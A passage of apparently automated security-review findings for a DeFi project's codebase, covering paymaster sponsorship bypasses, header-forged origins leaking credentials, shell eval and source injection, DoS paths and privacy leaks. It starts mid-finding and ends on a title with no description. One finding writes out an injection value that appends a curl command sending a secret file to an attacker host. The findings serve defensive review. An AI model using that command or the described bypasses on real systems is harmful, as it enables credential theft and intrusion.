The onchain DeploymentBatcher still requires the stored phase1SplitStates entry to be finalized and to match the supplied vault/wrapper/shareOFT, so such an operation should revert onchain. However, after this offchain validation passes, the handler forwards the request to the CDP paymaster; a reverting sponsored UserOperation can still consume the paymaster's gas budget. Before this commit, finalizePhase2 without CREATE2 hints had to match a Phase1Deployed event, so arbitrary linked contracts without deployment provenance were rejected.

title: Deploy self-bundling can abuse privileged fallback keys
description: The new transport intercepts eth_sendUserOperation for UserOps whose explicit gas sum exceeds 12M and submits them directly with EntryPoint.handleOps. However, deploy sessions always override UserOp gas to callGasLimit 16.75M plus verification/preVerification gas, so these deploy-session submissions will generally take the self-bundle path. The self-bundler reads DEPLOY_SESSION_SELF_BUNDLE_PRIVATE_KEY, but if it is unset it silently uses KPR_PRIVATE_KEY or generic PRIVATE_KEY. Those names are commonly used elsewhere in this repo for keeper/protocol automation keys. Because deploy-session resume/continue is a public authenticated API path, an attacker with deploy-session access can repeatedly cause that operational EOA to sign and submit high-gas handleOps transactions. This bypasses CDP bundler submission prechecks/simulation/rate accounting and can consume the key's nonce queue or gas on validation/race/failure cases, potentially disrupting keeper or admin automation that shares the same key. The fix should require a dedicated low-privilege self-bundler key in production, remove KPR_PRIVATE_KEY/PRIVATE_KEY fallback, add explicit quotas/concurrency controls for self-bundling, and perform local validation/simulation before sending handleOps.

title: Phase1 paymaster decode lacks codeId/vaultKind checks
description: After this patch, Phase1 DeploymentBatcher calls with the new vaultKind tuple, and legacy Phase1 overloads, are accepted by the paymaster decode path. However, the validation path for Phase1 only extracts creatorToken and owner and then classifies the call as deploy_phase1. Unlike Phase2/Phase3 and auxiliary deployment paths, it does not reject invalid vaultKind values or require codeIds to match the expected creator/agent deployment lane. In pass 2, any call to the DeploymentBatcher with an allowed selector is accepted without re-checking the decoded arguments. An authenticated/allowlisted wallet can therefore request sponsorship for malformed Phase1 calls that revert onchain, or for non-canonical/deprecated approved bytecode IDs if the onchain batcher allowlist permits them. This can bypass paymaster policy and create a sponsorship-drain path. The fix should parse and validate vaultKind for v1.19.1 Phase1 selectors, treat legacy selectors as creator-only or otherwise tightly scoped, and require codeIds to equal resolveDeployLanePhase1CodeIds(kind) before forwarding to the upstream paymaster.

title: Untrusted forwarded host controls server-side origin
description: The new origin resolution path returns the request's forwarded origin before VERCEL_URL without checking it against APP_ORIGIN, CORS_ALLOWED_ORIGINS, a known custom-domain allowlist, or private/link-local IP ranges. Because getForwardedOrigin is built directly from x-forwarded-proto and x-forwarded-host, a request that reaches the handler with a forged X-Forwarded-Host such as attacker.example or an internal IP becomes the canonical origin. Deploy-session code uses this canonical origin for server-side POSTs and forwards Cookie, Authorization, X-SIWA-Receipt, and deploy-session signature headers to that destination. This changes a previously configuration-derived origin into attacker-influenced network I/O. In affected deployments, an authenticated attacker can make the backend POST to arbitrary hosts under fixed API paths and can receive forwarded credentials on an attacker-controlled host; later deploy flow helpers can also forward deploy-session tokens/signatures to the attacker-selected origin.

title: Ungated chat LLM calls allow API-cost DoS
description: The commit changes intent collection to call classifyInverseAkitaChatOpinion for every top-level message whose deterministic parse is absent or loose. That classifier, when ALFACLUB_INVERSE_AKITA_CHAT_LLM_ENABLED is set, calls the external Eliza LLM provider. The eligibility check that requires at least one staked FriendKey is only performed later inside executeInverseAkitaChatReaction, after an intent has already been collected. Sender cooldown is also checked later and only after parsing. As a result, non-stakers or otherwise unauthorized chat participants can trigger paid LLM calls just by posting arbitrary non-command top-level chat in configured reaction rooms. This creates an externally triggerable resource-consumption path and can exhaust provider rate limits or budget even though the sender would never be allowed to execute a trade.

title: Cutover scripts can sync deprecated v1.18 infra
description: The commit partially updates post-broadcast/Vercel cutover scripts for v1.19.1, but the scripts still accept or prefer v1.18.0 handoff/default values. `execute-v1180-post-broadcast.sh` always sources `tmp/base-v1.18.0-handoff.env` and still defaults `REGISTRY` and `DEPLOYMENT_BATCHER` to the old v1.18.0 addresses while using a new v1.19.1 `LOTTERY_MANAGER`. It then calls `authorize-v1180-batcher-deployers.sh`, which also hardcodes the old handoff and old CREATE2/factory/batcher/helper defaults. Separately, `sync-v1180-vercel-env.sh` was changed to default to the v1.19.1 handoff but silently falls back to the v1.18.0 handoff; if that file exists, its exported variables override the new v1.19.1 fallback constants and are then written to Vercel server/client envs. This can leave production pointed at deprecated v1.18 infrastructure after a v1.19.1 greenfield cutover, or authorize/wire deprecated deployment components. Because these scripts are privileged operational tooling, exploitation requires operator execution or a polluted cutover environment, but the impact can be high integrity/availability for new vault launches and cross-component wiring.

title: Public deploy flow can overwrite registry vault-kind metadata
description: Registry4626.setAgentIntegrationMeta was changed from owner-only to onlyAuthorizedOrOwner. DeploymentBatcher is expected to be an authorized factory, but its phase deployment methods are public and only require params.owner to equal msg.sender or an authorized phase caller. Phase 1 derives CREATE2 salts from params.creatorToken, params.owner, and version, so an attacker can choose an existing/victim token address with their own owner/version and deploy a separate stack. During phase 2, DeploymentBatcher unconditionally calls Registry4626.setAgentIntegrationMeta(params.creatorToken, meta), overwriting metadata for the victim token without checking that the token is unregistered, that the registry token bindings point to the just-deployed vault/shareOFT, or that the caller controls the canonical registered deployment. This can corrupt registry integrity by flipping getVaultKind(token) to Agent and setting nativeAgentVault to an attacker-created vault, potentially causing offchain/onchain integrations that trust the registry lane metadata to misroute users or automation.

title: Open /signal command can exhaust bot and data APIs
description: The patch removes `/signal` from the Hermit operator-only command set and replaces the handler with a composite signal path that runs both `runFundingOiRegimeJob` and `runCounterTradeSignal`. The counter-trade signal runs a 7-day, 1-minute backtest; when cache coverage is unavailable, the existing market-bar loader fans out chunked Hyperliquid candle requests in 6-hour chunks. The command cooldown framework is only applied to `/gmeow` and `/meme`, so `/signal` has no per-room or per-user cooldown. As a result, any AlfaClub chat member can repeatedly issue `/signal` to tie up the chat worker for up to the backtest timeout, generate many external Hyperliquid calls, and cause DB writes/settlement work from the funding/OI job. This is an introduced availability/resource-exhaustion issue. Mitigations would be to keep `/signal` operator-only until it is cheap, add a durable per-room/per-sender cooldown and concurrency cap, cache/dedupe in-flight signals by symbol, or queue these jobs outside the webhook path.

title: Unbounded waitlist leaderboard cache enables memory DoS
description: The new `leaderboardCache` is a plain `Map` keyed by `page`, `limit`, `pointsType`, and `authorizedProfileId`. Cache entries are only checked for expiry when the same key is requested again; expired entries for one-off keys remain in memory forever, and there is no maximum cache size. The public `/api/waitlist/leaderboard` handler allows arbitrary positive `page` values, clamps only `limit`, and does not apply a rate limit. A remote unauthenticated client can repeatedly call the endpoint with unique `page` values such as `?page=1`, `?page=2`, ... to force a new cache insertion each time. Even pages beyond the real result set still create a response object and are cached. Over time this can exhaust memory on the warm serverless instance and cause availability impact.

title: Privy bridge auto-provisions wallets before email proof
description: The new server-side provisioning path is invoked unconditionally whenever the verified Privy user object has no linked wallets. /api/auth/privy is a generic bridge endpoint used after multiple Privy auth modes, but the new code does not verify that the token came from the intended email OTP signup path or that a verified email exists before creating a wallet. As a result, a caller with any valid zero-wallet Privy token, or a returning-wallet login racing before the external wallet appears in Privy, can receive a fresh embedded EOA and a cv_auth_session cookie. That bypasses the previous fail-closed behavior for zero-wallet users and can create authenticated, no-email or wrong-principal sessions before /api/waitlist/bootstrap performs email/collision policy checks. The fix should scope server-side wallet creation to an already-verified email signup flow, or move it behind the waitlist bootstrap email/collision checks; wallet-returning and non-email auth paths should continue to fail closed until the intended wallet is actually linked.

title: Deferred VRF lottery results became owner-selective
description: When a VRF result arrives while LotteryManager4626 is paused, the random word is stored on-chain. Before this commit, deferred request IDs were queued and unpause() automatically replayed the full FIFO queue via address(this), preventing the owner from choosing which revealed outcomes to settle. This commit removes the queue append and makes applyDeferredVrf() owner-only, while unpause() now only calls _unpause(). Because pendingRandomWord and vrfRequests are public, the owner can inspect whether a deferred request is a win, unpause, and then call applyDeferredVrf() only for selected request IDs. Winning users can be censored indefinitely while lottery service resumes for others, breaking unbiased payout settlement after pauses.

title: Unthrottled XMTP test uses protocol signer
description: The commit adds an XMTP alert-test command that directly calls `sendProtocolAgentXmtpDm` for the caller's wallet. That sender initializes XMTP using the protocol CSW Privy wallet and performs protocol-agent sends. Unlike existing Hermit cooldowns, which only apply to `/gmeow` and `/meme`, the new XMTP test path is not rate-limited at the command layer and is not operator-only. A room member or otherwise authorized Hermit caller can repeatedly invoke the command to force TEE attestation, Privy signing, XMTP startup, DM creation, and sends from the trusted protocol agent identity. This can burn upstream quota/resources and potentially disrupt protocol-agent XMTP availability, especially in runtimes with non-persistent XMTP DBs where repeated starts may create or rotate installations.

title: Unquoted RPC export is evaled by Shovel startup scripts
description: The commit adds probe-shovel-rpc.py with an --export mode that prints BASE_LOGS_RPC_URL=<selected URL> directly. railway-entrypoint.sh and sync-env-from-frontend.sh capture this output and run eval on it. Because the URL originates from BASE_LOGS_RPC_URL, BASE_READ_RPC_URL, or BASE_RPC_URL and is not shell-escaped, shell metacharacters such as command substitution can be executed if the selected endpoint is crafted, for example in a path/query component. The probe only requires the URL to respond like a Base JSON-RPC endpoint, so a malicious or compromised RPC provider URL could pass probing and then execute commands in the Railway/container or operator environment. In the production entrypoint this exposes the Shovel container context, including database connection secrets and the ability to tamper with generated indexer configuration or runtime behavior. The safer pattern is to avoid eval entirely, e.g. have the Python script emit JSON and parse it, or emit shell with shlex.quote and source only from trusted static files.

title: Room alerts can leak shared wallet risk to stale subscribers
description: Room 1659 alerts are no longer scoped to the sender's own Hyperliquid wallet: they monitor the room portfolio and possibly the Virtual Arena execution wallet. Subscriptions are persisted per sender wallet, and the alert runner later sends Telegram DMs to every enabled room-1659 row. At send time, the runner resolves the Telegram chat by wallet and sends the alert without checking current room membership, subscription status, or trusted-operator authorization. A user who once had room access, or any stale/erroneous alert row, can continue receiving room/Arena trading risk signals after access should have been revoked. This leaks sensitive strategy/risk information, including at-risk legs and combined PnL progress, though it does not directly allow fund movement.

title: AMOE cutover script can leave temporary root publisher active
description: The newly added `republish-amoe-roots-treasury-cutover.sh` uses `set -euo pipefail`, changes both AMOE publisher roles to a temporary treasury/admin address, then publishes roots, and only restores the canonical CSW publisher at the end. If any command after the first role change fails, such as a bad root value, an already-published epoch revert, an RPC/cast error, or the second role update failing, the script exits immediately and never executes the restore block. This can leave `allowlistPublisher` and/or `pointsLedgerPublisher` set to the temporary EOA instead of the intended canonical CSW publisher. Because those publisher roles are the accounts allowed to set allowlist and points-ledger Merkle roots for future epochs, this creates role drift and widens the blast radius if the temporary key is compromised or misused after a failed cutover.

title: Deployment handoff file is sourced as shell code
description: The newly added run-v1170-greenfield-cutover.sh writes and consumes tmp/base-${DEPLOYMENT_EPOCH_TAG}-handoff.env during a privileged deployment flow where PRIVATE_KEY and BASE_RPC_URL are present. After deployment it runs `set -a && source "$HANDOFF_ENV" && set +a`. The handoff file is not a trusted shell script; it is generated by deploy-base-full-release.sh using raw, unescaped values such as DEPLOYMENT_EPOCH_TAG, BASE_SHARED_GLOBAL_OUTPUT_PATH, and HANDOFF lines from forge logs. Shell metacharacters or command substitutions in any sourced assignment will execute on the operator/CI host before seeding the bytecode store, potentially exposing the deploy private key or altering deployment state. Existing helper code in deploy-base-full-release.sh already has a safer load_env_file parser; the new script should use that style of parsing or restrict parsed variables to expected address/path formats instead of `source`.

title: AMOE eligibility now trusts spoofable profile email flags
description: The changed AMOE resolver now treats any non-merged profile with p.email_verified = TRUE and a non-synthetic p.email as a verified Privy profile. However, the waitlist bootstrap path can derive resolvedEmail from the client-supplied bootstrapEmailHint when extractPrivyVerifiedEmail(privyUser) is absent, and then calls upsertAccount with emailVerified: true. upsertAccount persists that value into profiles.email_verified. Before this commit, AMOE checked accounts.email_verified via an accounts join, so this spoofable profiles flag was not sufficient for AMOE eligibility. After this commit, an attacker with a wallet-only Privy session can submit an arbitrary non-synthetic email hint, get profiles.email_verified set, and then pass the AMOE verified_privy_only gate for credit snapshots and daily Twitter credit awards. This weakens the anti-Sybil/verified-email requirement for AMOE lottery credits.

title: Unbounded command-claim cache enables bridge memory DoS
description: The new tryClaimCommandReply path stores every successfully claimed command key in inMemoryClaimedReplyKeys. Message IDs are unique for normal chat traffic, and the cache is not capped, TTL-based, or periodically pruned. Because executeCommandBatch and executeInverseAkitaChatReactionBatch call tryClaimCommandReply before handling each eligible message, an attacker who can post slash commands in a configured AlfaClub command room can force the bridge process to retain one new string per command indefinitely. This bypasses the existing bounded in-memory structures used elsewhere in the bridge and can eventually exhaust memory or degrade availability of the AlfaClub/Hermit command bridge. The durable database ledger already provides cross-process dedupe, so the process-local cache should be bounded or time-limited if retained.

title: Raw wallet hydration errors exposed by /accounts/me
description: The changed /accounts/me handler now catches bootstrapCanonicalDelegationState failures and copies error.message directly into the successful JSON response. That bootstrap path performs server-side Privy, DB, and Base RPC work. Some errors are intentionally internal, and viem/RPC errors may include request/URL details; BASE_RPC_URL is read from server environment and can contain keyed provider URLs. Previously this inner catch kept the endpoint resilient by returning the base payload without surfacing the internal exception. An authenticated user whose account needs wallet hydration can now receive raw backend error strings instead of a generic user-safe message.

title: Paymaster allowlist not updated for Phase 1 ABI change
description: Phase 1 deployment calls now include an extra `VaultKind vaultKind` field in `Phase1Params`. This changes the calldata encoding and the selectors for functions that take `Phase1Params`. However, the paymaster's `CREATOR_VAULT_BATCHER_PHASE_ABI` still defines Phase 1 params with only seven fields ending at `version`, and `ALLOWED_BATCHER_SELECTORS` still uses hard-coded pre-change selectors. As a result, legitimate current Phase 1 calls will fail paymaster validation, while stale pre-change selectors remain allowlisted. An authenticated/allowlisted deploy-session caller can submit an old-selector batcher call that passes paymaster validation but reverts on the upgraded batcher, wasting sponsored gas and causing paymaster/deployment availability issues. The deploy dry-run path has the same stale Phase 1 tuple definition, so server-side deployment validation is also out of sync.

title: Raw trade failure output is posted back to chat
description: Failed Arena trade execution is run as a child process with the service environment plus Arena/ACP signing-related environment. This commit adds summarizers that collect raw error, stderr, and stdout lines, intentionally skip the generic "Command failed" line, and include the first underlying tool-output line in public inverse-trade replies and /h arena Details. A room participant who can trigger an inverse trade failure can therefore cause the bot to post arbitrary dgclaw/ACP/tsx failure output into the room. That output is not passed through the existing sanitizer/redactor before being displayed, so if the tool prints paths, environment assignments, ACP state, token material, private-key-related diagnostics, or other sensitive operational data, it becomes visible to chat participants. The safer pattern is to log full child-process output server-side only and return a small allowlisted error code/message to chat, or at minimum apply a central redaction routine to stdout/stderr before including it in replies.

title: Hard-coded automation Safe blocks emergency rotation
description: Before this commit, the default protocolAutomation address was zero, so resolveProtocolAutomationAddress() fell through to PROTOCOL_AUTOMATION_SAFE / 4626_PROTOCOL_AUTOMATION_SAFE. The commit hard-codes the hot Safe in BASE_DEFAULTS. In Vercel production, getApiContracts() uses pickAddressProdSafe(), which returns the fallback default when VERCEL is set and ALLOW_API_CONTRACT_OVERRIDES is not enabled. Because the fallback is now non-zero, resolveProtocolAutomationAddress() returns it immediately and never consults the environment. As a result, if the hot automation Safe or its 1-of-1 owner key must be rotated, setting PROTOCOL_AUTOMATION_SAFE in production will not work; deploy config and keeper automation will continue to treat the old hard-coded Safe as the Charm manager / Ajna admin until code is changed and redeployed. Under the threat model where privileged keys may leak, this materially weakens incident response and can keep new deployments or automation flows tied to a compromised Safe.

title: Agent wrapper over-pulls taxed deposits
description: The new AgentOVaultCoreModule supports fee-on-transfer tokens by measuring how many tokens the vault actually receives. However, AgentOVaultWrapper first transfers the nominal user-supplied amount into the wrapper, then calls vault.deposit(amount, ... ) with the original nominal amount. If the agent token charges a transfer fee on the user-to-wrapper transfer, the wrapper receives less than amount but still asks the vault to pull amount. With no surplus wrapper balance this makes wrapper deposits unusable for taxed tokens. If the wrapper has any underlying token balance from accidental transfers, reflections, or other surplus, a depositor can use that surplus to satisfy the over-pull and mint ShareOFT backed partly by tokens they did not provide. The wrapper should measure its balance delta from the user transfer and deposit only the measured amount into the vault.

title: WETH fee wrapping leaks lottery dust to voters
description: The commit changed the WETH fee path from splitting vault shares directly to wrapping the lottery and voter slices into ShareOFT. `CreatorOVaultWrapper.wrap()` is not stateless: it adds `userDustShares[accountingUser]` to the next wrap and stores the remainder after dividing by `NORMALIZATION_FACTOR` (1000). The gauge calls `wrapper.wrap()` multiple times in sequence from the same address, so any remainder from the lottery slice becomes dust for `msg.sender == gauge` and is then included in the subsequent voter slice wrap. For example, with 10,000 vault shares, the intended split is 6,900 lottery shares, 2,139 voter shares, and 961 burn shares. The first wrap mints only 6 ShareOFT and stores 900 vault-share dust; the voter wrap then mints from 2,139 + 900, producing 3 ShareOFT. This shifts value that should have stayed in the jackpot reserve to voter rewards. If a positive slice is below 1000 vault shares, the wrapper reverts with `AmountTooSmallToNormalize`, so small WETH fee processing can also fail until larger batches accumulate. Since `processWETHFees()` can be permissionless when `maxPermissionlessWethProcess` is enabled, callers can influence processing cadence and rounding outcomes.

title: Client-controlled settledAt authority bypasses sweep gate
description: The new settlement guard is intended to ensure `settledAt` and `settlementStage="completed"` are written only by the sweep-completion path after on-chain completion invariants pass. However, both keeper settlement endpoints trust a request-supplied `settledAtAuthority`. Because the accepted value is a public constant (`"sweep-completion"`), an authenticated keeper caller can POST that value to `/api/keeper/mark-settled` or `/api/keeper/control-plane/settle` and bypass the new guard without running `/api/keeper/sweep` or proving the invariant checks. The legitimate internal paths do set this authority after a completed sweep, but the direct endpoints do not distinguish those internal calls from external keeper-authenticated requests.

title: Unverified wallet hints can skew AlfaClub scoring
description: Before this change, vigilante metrics were fetched for the creator address. The new `resolveHyperliquidAddress` path first trusts `lookupRoomTradingWalletHint`, which reads raw `tradingWallet`, `walletAddress`, `portfolioWallet`, or `hyperliquidWallet` fields from external room snapshot/explore data and only validates that the value is syntactically an EVM address. There is no signature, on-chain binding, profile ownership check, or relationship check to the room creator before the fetched Hyperliquid state is attached to that creator's metrics. Those metrics are then ranked and may be used for Lens scorecards or ERC-8004 feedback. If attackers can set or influence their room metadata, they can claim a high-performing third-party Hyperliquid wallet and manipulate leaderboard/reputation integrity.

title: ACP_BIN is interpolated into shell commands
description: getAcpBin() now prefers ACP_BIN or ARENA_ACP_BIN directly. That returned string is later interpolated into execSync command strings used to run ACP wallet commands. Because execSync(string) executes through a shell, any shell metacharacters in the configured ACP binary value are interpreted as commands. For example, a poisoned runtime environment such as ACP_BIN='acp; curl -d @/path/to/secret https://attacker #' would execute attacker-controlled shell code when an Arena trade/transfer needs ACP signing or when auto-detecting the ACP wallet. The Dockerfile also sets ACP_BIN=acp, ensuring the new environment-based branch is used in the Hermit image. Exploitation requires control over the process environment, PATH, or a dotenv-loaded environment source, so this is not a direct unauthenticated HTTP issue, but it turns a configuration/env injection into arbitrary command execution in a process that may hold ACP/session/wallet secrets.

title: Allowlist blocks risk-reducing closes for existing positions
description: The commit intends to restrict new counter-trade entries to allowlisted assets, but the checks also affect risk-reducing operations. In counterTradeRunner, a fill is skipped as pair_not_allowlisted before the code classifies it as an exit and calls handleCounterTradeExitFlow. Separately, deriveCounterTradeDefenseActions filters non-allowlisted open legs before generating defend_reduce or harvest_take_profit actions, and runArenaTrade validates the allowlist for all actions, including action: 'close'. If the bot has any existing position in an asset that is later removed from the allowlist, or an operator needs to close a legacy/manual non-allowlisted leg, the automation will skip the user's close/liquidation signal and the defense loop will not reduce the risky leg. The generic runArenaTrade rejection also prevents closing it through the same Arena command path. This can leave the executor holding an unintended naked position until liquidated or until an out-of-band manual intervention is performed. The allowlist should be enforced for opening/increasing exposure, but close/reduce-only paths should remain permitted for any currently held asset.

title: Public key-safety API proxies arbitrary wallet balances
description: The newly added /api/v1/alfaclub/key-safety-room route is unauthenticated, allows cross-origin reads, and forwards req.query.tradingWallet into resolveKeySafetyRoomContext. resolveTreasuryWallet gives that caller-controlled address highest priority, and readTreasuryUsd then performs server-side DeBank and Hyperliquid lookups for that address. The response includes totalTreasuryUsdc, hyperliquidAccountValueUsd, debankTotalUsd, and tradingWalletAddress. As a result, anyone who knows any valid roomId can use this endpoint as an unauthenticated wallet portfolio oracle and as a way to consume the server's DeBank API quota / external request budget for arbitrary EVM addresses. The override should not be accepted from a public unauthenticated query parameter; it should be limited to trusted configuration/admin paths or constrained to room-associated wallets.

title: Unthrottled X verification burns paid API quota
description: The commit adds an authenticated POST endpoint that verifies waitlist X engagement by calling the live X API. After Privy authentication, the handler immediately calls verifyAndAwardWaitlistTwitterEngagementStep with no durable or in-memory rate limit keyed by user or IP. For an account whose follow step is not already recorded, each valid POST reaches verifyTwitterEngagementStep and issues external X API requests, including a following-list lookup. An attacker can create or use a linked X account that does not follow @4626fun and repeatedly POST {"step":"follow"}; because the step never becomes complete, every request can trigger another paid/rate-limited X lookup. This can exhaust the app's X API quota or Pay-Per-Use budget and cause legitimate users to receive X rate-limit or verification-unavailable failures. The endpoint should apply a durable per-principal/per-IP rate limit and cooldowns for failed verifications before making X API calls, and ideally add request timeouts.

title: Ops script exposes PRIVATE_KEY in child process args
description: The commit adds `ops:write-erc8004-agent-uri`, which loads `.env` and can submit an ERC-8004 `setAgentURI` transaction through `--submit-eoa`. In that path, the script reads `PRIVATE_KEY` from the environment and then places it directly in the `spawnSync('cast', args, ...)` argument array as the value for `--private-key`. Command-line arguments are commonly visible to other local users or processes through tools like `ps` or `/proc`, and may also be captured by process monitoring on CI/ops hosts. If the supplied key is an owner/operator key capable of calling `setAgentURI` or other privileged actions, exposure would allow an attacker with local/process-observation access during execution to steal that key.

title: Meteora pool provisioning trusts unverified share mints
description: This commit adds automatic Meteora DLMM pool provisioning after Solana share-mesh deployment. The deploy-session payload already accepts a raw `solanaOvault.shareMeshMint` from the client and only trims it. The new code then persists that value and immediately enqueues a pool-provisioning keeper job with the mint. On the keeper side, `/api/keeper/solana/provision-creator` treats a provided `shareMeshMint` as a complete mapping (`status: 'provided'`) and skips looking up an applied `solana_share_mesh_mappings` row for the creator. It then sends that mint as `tokenMintX` to the privileged Solana provisioner with its bearer secret. As a result, an authenticated/entitled deploy actor, or anyone able to enqueue/call this keeper path, can cause the provisioner payer to attempt or create Meteora pools for arbitrary Solana mints rather than only the verified LayerZero share-mesh mint for the creator. The direct enqueue also races ahead of the intended sync-mapping job because it carries the provided mint and has higher priority, so pool creation can happen even if mapping registration later fails.

title: Public waitlist stats leaks recent member identities
description: The commit changes unauthenticated GET /api/waitlist/stats from exposing only recent avatar image URLs to exposing structured avatar objects containing labels and hrefs. The new SQL selects Zora handles, basenames, and CSW/primary wallet addresses for recent profiles, and buildAvatar turns those into hover labels and profile links. Because the handler performs no authentication or authorization, any remote caller can poll this endpoint to identify the newest waitlist members and correlate waitlist membership/recency with Zora identity or on-chain addresses. The exposure is bounded to a small number of recent members and mostly public identifiers, but it introduces a privacy/info-leak regression relative to the previous image-only design.

title: WSL dry-run exposes local API server to LAN
description: Under WSL, dev-deploy-dry-run.sh now defaults VITE_DEV_SERVER_HOST to true. That value is resolved to 0.0.0.0 and passed to Vite, making the development server reachable from the WSL/LAN interface by default. This server is not just static frontend assets: vite.config.ts installs local API route middleware in serve mode, loads repo and frontend .env files into process.env for those handlers, and dispatches any /api/* request to local API handlers. The dry-run script also keeps DB-backed routes enabled by default. As a result, anyone on the adjacent network can directly call the developer's local /api routes and consume or interact with server-side integrations using the developer's local environment, rather than only the intended Windows localhost browser. The default should remain loopback-only, with LAN binding requiring an explicit opt-in and/or the API middleware rejecting non-loopback remote addresses when secrets/DB routes are enabled.

title: Internal audit findings published under public docs
description: The patch does not modify runtime product code, but it introduces an information disclosure by committing consolidated deep-risk audit artifacts into the public-facing docs/audits tree. The newly added report states that the source material came from docs/_internal/audits-workpapers and even records that these audit docs had previously been moved from docs/audits into docs/_internal/audits-workpapers. Despite that, the commit adds them back under docs/audits and marks them as a canonical public report set. The files disclose active launch blockers, exact routes, handler names, missing authentication/rate-limit controls, external side effects, environment secret names/presence, and remediation criteria. Even without raw credentials, this is a useful attacker roadmap and should remain internal or be heavily sanitized before publication.

title: WSL dry-run exposes Vite API server on all interfaces
description: In WSL, the deploy dry-run script now sets VITE_DEV_SERVER_HOST=true by default, resolves that value to 0.0.0.0, and starts Vite with that host. This changes the dry-run server from loopback-only to network-accessible. The same Vite dev server mounts local /api handlers and explicitly loads repo/frontend .env files, including DB and third-party API credentials. Because DEPLOY_DRY_RUN_KEEP_DB_ENV defaults to keeping DB configuration enabled, an adjacent-network user who can reach the WSL IP can call unauthenticated or weakly gated local dev API routes, consume server-side API integrations, pollute local or production-configured databases, and interact with fork/deploy dry-run services. The commit also pins app/Privy origins to the WSL LAN IP, making the LAN URL an intended trusted dev origin rather than a purely local fallback. The safer behavior is to keep loopback binding by default and require an explicit opt-in for 0.0.0.0, or bind only to an interface reachable by the Windows host and add network/origin guards for local API routes.

title: Phase boundary check permits smuggled batcher calls
description: The commit adds assertDeploySessionPhaseBoundaries() and wires it into deploy-session execution, but the Phase 3 validation only checks that the first call is deployPhase3Strategies, rejects launchDeferredAuction and a few post-auction CCA selectors, and requires that some call has the deployToStrategies selector. It does not reject other DeploymentBatcher phase selectors inside phase3Calls, such as deployPhase1, deployPhase2Core, or finalizePhase2. This is security-relevant because deploy-session creation accepts caller-provided phase3Calls after checking paid-feature entitlement only for the top-level creatorToken, and the paymaster validation determines the deploy mode from the first batcher call, then later accepts any allowlisted batcher selector on the batcher target without decoding or binding subsequent calls to the same creator token/phase. A malicious authenticated deploy user can therefore create a Phase 3 payload with a valid first deployPhase3Strategies call for an entitled creator and smuggle extra batcher operations for another creator token controlled by the same smart wallet, causing sponsored out-of-phase deployment work and bypassing per-creator phase/feature/allowlist intent. On-chain _requireOwner limits this to operations where the smart wallet is the owner, so this is not direct theft of another user's funds, but it is a deploy/paymaster authorization and sponsorship-policy bypass.

title: Chat fallback names treated as verified Basenames
description: The new fallback-name Basename lookup converts any non-address fallbackName such as a DM hint or group/conversation name into a .base.eth candidate, fetches that profile, and then uses basenameFromFallbackName as basenameName before returning source: 'basename'. This is not bound to normalizedAddress. As a result, a peer or conversation whose real EVM address has no verified identity can be displayed as a Basename-derived identity chosen from an untrusted fallback label, and private/group chat names that look like handles are sent to external ENS/Basename infrastructure. getBasenameProfileByName also returns a profile object with name set to the requested basename even if no ownership/address resolution was checked, so the hook treats mere syntactic handles as basename identities. The fix should only use a fallback-name Basename profile after resolving the basename address and confirming it matches normalizedAddress, and should avoid external fallback-name lookups for group names or other untrusted labels.

title: Vercel preview builds re-enabled for unreviewed docs code
description: The docs-site Vercel configuration previously enforced production-only builds from the default branch using both Vercel's git deployment gating and an ignoreCommand script that exits successfully for preview, PR, and non-main refs. This commit replaces that configuration with only an install command and production build command. As a result, unless project-level settings outside the repo compensate, Vercel will create preview deployments for branch pushes and PRs. Because Vercel runs `pnpm install` and then `pnpm run build:production` on the unreviewed branch contents, an attacker who can trigger a docs-site preview build could modify package scripts, dependencies, or build-time JavaScript to execute arbitrary code in the Vercel build environment. That code could exfiltrate any preview/build environment variables available to the docs project, abuse build credentials/network access, or publish malicious preview content. The still-present `scripts/vercel-ignore.sh` shows the intended control, but it is no longer referenced by `vercel.json`.

title: Privy proxy leaks 4626 session cookies upstream
description: The added catch-all handler proxies requests whose Host is privy.4626.fun to https://auth.privy.io. In doing so it copies every request header except host/content-length into upstreamHeaders. Because the app's auth cookies are scoped to .4626.fun, browsers making same-site requests to privy.4626.fun can include cv_auth_session/cv_auth_nonce in the Cookie header. The proxy then forwards those HttpOnly session cookies to the external Privy upstream. It also blindly mirrors upstream response headers back to the first-party subdomain, including Set-Cookie, which increases the risk of third-party cookie injection/fixation if the upstream ever emits a parent-domain cookie. The proxy should use an explicit allowlist of Privy-required headers, strip application cookies and other first-party credentials, and handle Set-Cookie deliberately.

title: Unauthenticated backtest audit file disclosure
description: The commit adds a new exact v1 route for `alfaclub/backtest-audit`. Its handler sets wildcard CORS, accepts unauthenticated GET requests, scans local `tmp/backtests` directories, reads a selected `*-rebalances.csv` file, parses the whole file into memory, and returns the rows to the caller. It also returns `searchedDirs`/`resolvedDir` and raw filesystem error messages, which disclose deployment paths. Because the response is not scoped to an authenticated user or capped by file size/row count, any network caller can retrieve operational backtest audit data and can force expensive reads/JSON serialization of large CSV audit files if such files exist.

title: Standalone AMOE route bypasses trusted-origin guard
description: Before this change, `lottery/amoe/submit-zk` was reachable through the catch-all API router, which calls `enforceCookieSessionTrustedOrigin` before invoking the route handler. That guard rejects authenticated state-changing requests when the Origin/Referer is missing or not in the trusted origin set. The new standalone `frontend/api/v1/lottery/amoe/submit-zk.ts` exports `_amoeSubmitZk` directly and `vercel.json` deploys it as its own function, so exact requests to this path no longer pass through `dispatchCatchAllRequest`. The handler does rate limiting and AMOE-specific validation, but it does not call `enforceCookieSessionTrustedOrigin`; it also sets permissive public CORS headers. This weakens CSRF/stolen-token defenses for a state-changing endpoint that can consume AMOE nonces/credits and relay a lottery entry when the attacker can cause or reuse a valid authenticated AMOE submission payload.

title: Spot sweep can move the wrong wallet's USDC
description: The counter-trade loop now reads `identity.agentWalletAddress` via `getSpotUsdcBalance()` and, if the balance is above the threshold, calls `runArenaSpotPerpTransfer()` with only an amount. The transfer command does not bind the transfer to the wallet whose balance was checked; it shells out to `trade.ts`, where `usdClassTransfer` is explicitly a user-signed action that moves funds for the account that signs. In the ACP lane, the child environment only sets `HL_MASTER_ADDRESS` to `config.agentWalletAddress` when the parent process does not already have `HL_MASTER_ADDRESS`, and the actual ACP CLI signer is not verified against `identity.agentWalletAddress` before transferring. As a result, in deployments with an ambient master address or mismatched ACP state, an active/mapped counter-trade identity can cause the sweep to be triggered based on its own spot balance while the signed transfer moves a different configured ACP wallet's spot USDC into perps margin. That does not directly withdraw funds, but it changes custody class and exposes those funds to automated perps trading/liquidation risk.

title: Key safety ignores raids by existing majority holders
